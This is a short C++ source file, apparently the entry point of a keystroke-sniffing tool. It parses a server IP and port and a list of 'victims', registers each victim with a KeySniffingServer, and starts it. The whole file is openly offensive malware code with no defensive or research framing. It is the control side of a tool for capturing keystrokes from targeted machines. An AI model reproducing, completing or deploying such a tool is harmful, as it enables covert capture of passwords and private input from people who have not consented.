#include "common/common.hpp"
#include "server.hpp"

struct Arguments
{
    std::string server_ip;
    int server_port;
    std::vector<std::string> victims;

    static bool Parse(int argc, char *argv[], Arguments &arguments)
    {
        Strings args;
        for (int i = 0; i < argc; ++i) {
            args.push_back(argv[i]);
        }

        return Parse(args, arguments);
    }

    static bool Parse(Strings const &args, Arguments &arguments)
    {
        if (args.size() < 6) {
            return false;
        }

        if (args[1] != "--server") {
            return false;
        }

        arguments.server_ip = args[2];
        arguments.server_port = atoi(args[3].c_str());

        if (args[4] != "--victims") {
            return false;
        }

        for (size_t i = 5; i < args.size(); ++i) {
            arguments.victims.push_back(args[i]);
        }

        return true;
    }
};

int main(int argc, char *argv[])
{
    Arguments arguments;

    if (!Arguments::Parse(argc, argv, arguments)) {
        std::cout << "Incorrect arguments!" << std::endl;
        return -1;
    }

    KeySniffingServer server(arguments.server_ip, arguments.server_port);
    for (std::vector<std::string>::const_iterator it = arguments.victims.begin(); it != arguments.victims.end(); ++it) {
        server.AddVictim(*it);
    }

    server.Start();
    server.Wait();
}
